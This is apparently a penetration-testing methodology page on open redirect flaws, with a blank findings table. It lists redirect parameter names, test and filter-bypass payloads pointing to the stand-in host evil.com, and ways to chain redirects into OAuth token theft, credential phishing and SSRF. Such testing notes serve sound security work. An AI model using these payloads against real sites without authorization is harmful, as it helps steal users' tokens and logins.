---
title: "Open Redirect"
---

## What It Is

Open redirects let you craft a link on the target domain that redirects to an attacker-controlled site. Low severity alone, but valuable for chaining with OAuth token theft or phishing.

## Where to Look

- Login/logout redirect parameters (`?redirect=`, `?next=`, `?url=`, `?return_to=`)
- OAuth callback URLs
- Any URL parameter that triggers a redirect

## Testing

```
# Common parameter names
?redirect=https://evil.com
?next=https://evil.com
?url=https://evil.com
?return_to=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?rurl=https://evil.com
?redirect_uri=https://evil.com
```

## Bypasses

```
# Protocol-relative
//evil.com

# Backslash
https://<TARGET>/redirect?url=https://evil.com\@<TARGET>

# At sign
https://<TARGET>/redirect?url=https://<TARGET>@evil.com

# Subdomain trick
https://<TARGET>/redirect?url=https://evil.com.target.com

# URL encoding
https://<TARGET>/redirect?url=https%3A%2F%2Fevil.com

# Double encoding
https://<TARGET>/redirect?url=https%253A%252F%252Fevil.com

# Null byte
https://<TARGET>/redirect?url=https://evil.com%00.target.com

# Tab / newline
https://<TARGET>/redirect?url=https://evil.com%09.target.com
```

## Chaining for Higher Impact

- **OAuth token theft**: redirect_uri → evil.com → capture OAuth token
- **Phishing**: target.com/redirect?url=evil.com/fake-login → steal creds
- **SSRF**: if redirect is followed server-side → treat as SSRF

## Findings

| Endpoint | Parameter | Bypass Needed | Chain Potential | Status |
|----------|-----------|---------------|-----------------|--------|
| | | | | |
